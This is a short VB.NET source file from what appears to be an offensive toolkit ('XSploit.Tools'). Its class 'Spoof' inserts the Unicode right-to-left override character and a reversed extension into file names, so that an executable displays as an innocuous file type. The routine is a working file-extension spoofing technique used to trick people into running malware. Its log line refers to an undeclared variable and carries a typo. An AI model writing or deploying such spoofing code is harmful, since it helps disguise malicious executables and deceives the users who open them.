Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Linq
Imports System.Text
Imports System.Threading.Tasks

Namespace XSploit.Tools
	Friend Class Spoof
		Public Shared Function ReverseString(ByVal myStr As String) As String
			Dim myArr() As Char = myStr.ToCharArray()
			Array.Reverse(myArr)
			Return New String(myArr)
		End Function

		Public Shared Function Extension(ByVal file As String, ByVal extension_Renamed As String) As String
			Dim reverseChar As String = ChrW(&H202E).ToString()
			Dim Spoofed = Path.GetFileNameWithoutExtension(file) & reverseChar & ReverseString(extension_Renamed) & Path.GetExtension(file)
			Console.WriteLine($"Chaning FileName To {Path.GetFileNameWithoutExtension(file)}exe.{extension}")
			Return Spoofed

		End Function
	End Class
End Namespace
